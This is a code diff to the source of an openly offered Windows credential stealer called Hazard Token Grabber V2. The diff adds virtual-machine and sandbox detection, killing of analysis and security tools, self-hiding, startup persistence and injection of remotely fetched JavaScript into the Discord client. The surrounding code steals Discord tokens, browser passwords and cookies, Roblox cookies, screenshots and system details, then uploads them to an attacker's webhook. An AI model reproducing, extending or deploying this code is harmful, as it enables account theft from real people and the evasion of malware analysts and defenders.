@@ -1,6 +1,7 @@
 import os
 import json
 import httpx
+import winreg
 import ctypes
 import shutil
 import psutil
@@ -19,17 +20,56 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # Replace the string inbetween the quotations with your webhook.
+    # replace WEBHOOK_HERE with your webhook
     'webhook': "put_your_webhook_here",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-    # set to False if you don't want it to kill Discord upon running exe
-    'kill_discord': False,
+    # set to False if you don't want it to kill programs such as discord upon running the exe
+    'kill_processes': True,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': False
+    'hide_self': True,
+    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
+    'anti_debug': True,
+    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
+    'blackListedPrograms':
+    [
+        "httpdebuggerui",
+        "wireshark",
+        "fiddler",
+        "regedit",
+        "cmd",
+        "taskmgr",
+        "vboxservice",
+        "df5serv",
+        "processhacker",
+        "vboxtray",
+        "vmtoolsd",
+        "vmwaretray",
+        "ida64",
+        "ollydbg",
+        "pestudio",
+        "vmwareuser",
+        "vgauthservice",
+        "vmacthlp",
+        "x96dbg",
+        "vmsrvc",
+        "x32dbg",
+        "vmusrvc",
+        "prl_cc",
+        "prl_tools",
+        "xenservice",
+        "qemu-ga",
+        "joeboxcontrol",
+        "ksdumperclient",
+        "ksdumper",
+        "joeboxserver"
+    ]
+
 }
+Victim = os.getlogin()
+Victim_pc = os.getenv("COMPUTERNAME")
 
 
 class functions(object):
@@ -66,20 +106,21 @@ class functions(object):
             return "Failed to decrypt password"
 
     @staticmethod
-    def config(e: str) -> str or bool | None:
+    def fetchConf(e: str) -> str or bool | None:
         return config.get(e)
 
 
 class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
-        self.webhook = self.config('webhook')
+        self.webhook = self.fetchConf('webhook')
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.dir = mkdtemp()
-        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        self.startup_loc = self.roaming + \
+            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:(.*?)\""
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
         self.tokens = []
@@ -108,17 +149,20 @@ class Hazard_Token_Grabber_V2(functions):
             self.tokens.append(tkn)
 
     async def init(self):
+        if self.fetchConf('anti_debug'):
+            if AntiDebug().inVM:
+                os._exit(0)
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
                          self.grabRobloxCookie]
-        if self.config('hide_self'):
+        if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
-        if self.config('kill_discord'):
-            function_list.append(self.killDiscord)
+        if self.fetchConf('kill_processes'):
+            await self.killProcesses()
 
-        if self.config('startup'):
+        if self.fetchConf('startup'):
             function_list.append(self.startup)
 
         if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
@@ -134,6 +178,7 @@ class Hazard_Token_Grabber_V2(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
+        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
@@ -142,14 +187,41 @@ class Hazard_Token_Grabber_V2(functions):
 
     def startup(self):
         try:
-            shutil.copy2(argv[0], self.startup)
+            shutil.copy2(argv[0], self.startup_loc)
         except Exception:
             pass
 
-    def killDiscord(self):
+    async def injector(self):
+        for _dir in os.listdir(self.appdata):
+            if 'discord' in _dir.lower():
+                discord = self.appdata+self.sep+_dir
+                disc_sep = discord+self.sep
+                for __dir in os.listdir(os.path.abspath(discord)):
+                    if match(r'app-(\d*\.\d*)*', __dir):
+                        app = os.path.abspath(disc_sep+__dir)
+                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
+                        if os.path.exists(inj_path):
+                            if self.startup_loc not in argv[0]:
+                                try:
+                                    os.makedirs(
+                                        inj_path+'initiation', exist_ok=True)
+                                except PermissionError:
+                                    pass
+                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
+                                "%WEBHOOK%", self.webhook)
+                            try:
+                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                    indexFile.write(f)
+                            except PermissionError:
+                                pass
+                            os.startfile(app + self.sep + _dir + '.exe')
+
+    async def killProcesses(self):
+        blackListedPrograms = self.fetchConf('blackListedPrograms')
+        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
+            blackListedPrograms.append(i)
         for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in
-                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                 try:
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
@@ -308,6 +380,7 @@ class Hazard_Token_Grabber_V2(functions):
             self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         login = self.dir+self.sep+"Loginvault2.db"
+
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
@@ -419,20 +492,20 @@ class Hazard_Token_Grabber_V2(functions):
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
-        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
-        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
+        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         # ip, country, city, region, googlemap = "None"
         data = httpx.get("https://ipinfo.io/json").json()
-        ip = data.get('ip').replace(" ", "᠎ ")
-        city = data.get('city').replace(" ", "᠎ ")
-        country = data.get('country').replace(" ", "᠎ ")
-        region = data.get('region').replace(" ", "᠎ ")
-        org = data.get('org').replace(" ", "᠎ ")
+        ip = data.get('ip')
+        city = data.get('city')
+        country = data.get('country')
+        region = data.get('region')
+        org = data.get('org')
         googlemap = "https://www.google.com/maps/search/google+map++" + \
             data.get('loc')
 
         _zipfile = os.path.join(
-            self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+            self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -454,7 +527,7 @@ class Hazard_Token_Grabber_V2(functions):
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{os.getlogin()}* Just ran Hazard Token Grabber.V2',
+                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
                         'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
@@ -464,18 +537,18 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {ip}
-                                Org:᠎ {org}
-                                City:᠎ {city}
-                                Region:᠎ {region}
-                                Country:᠎ {country}```
+                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
+                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
+                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
+                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
+                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
+                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                 WinKey:᠎ {wkey}
                                 Platform:᠎ {wname}
                                 DiskSpace:᠎ {disk}GB
@@ -510,6 +583,89 @@ class Hazard_Token_Grabber_V2(functions):
         with open(_zipfile, 'rb') as f:
             httpx.post(self.webhook, files={'upload_file': f})
         os.remove(_zipfile)
+
+
+class AntiDebug(functions):
+    inVM = False
+
+    def __init__(self):
+        self.processes = list()
+
+        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
+                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
+        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
+                                   "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
+        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
+                                 "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]
+
+        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
+            process = threading.Thread(target=func, daemon=True)
+            self.processes.append(process)
+            process.start()
+        for t in self.processes:
+            try:
+                t.join()
+            except RuntimeError:
+                continue
+
+    def programExit(self):
+        self.__class__.inVM = True
+
+    def programKill(self, proc):
+        try:
+            os.system(f"taskkill /F /T /IM {proc}")
+        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
+            pass
+
+    def listCheck(self):
+        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
+            if os.path.exists(path):
+                self.programExit()
+
+        for user in self.blackListedUsers:
+            if Victim == user:
+                self.programExit()
+
+        for pcName in self.blackListedPCNames:
+            if Victim_pc == pcName:
+                self.programExit()
+
+        try:
+            myHWID = subprocess.check_output(
+                r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
+        except Exception:
+            myHWID = ""
+        for hwid in self.blackListedHWIDS:
+            if myHWID == hwid:
+                self.programExit()
+
+    def specsCheck(self):
+        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
+        if int(ram) <= 3:  # 3gb or less ram
+            self.programExit()
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
+        if int(disk) <= 50:  # 50gb or less disc space
+            self.programExit()
+        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
+            self.programExit()
+
+    def registryCheck(self):
+        reg1 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
+        reg2 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
+        if (reg1 and reg2) != 1:
+            self.programExit()
+
+        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+        try:
+            reg_val = winreg.QueryValueEx(handle, '0')[0]
+
+            if ("VMware" or "VBOX") in reg_val:
+                self.programExit()
+        finally:
+            winreg.CloseKey(handle)
 
 
 if __name__ == "__main__" and os.name == "nt":
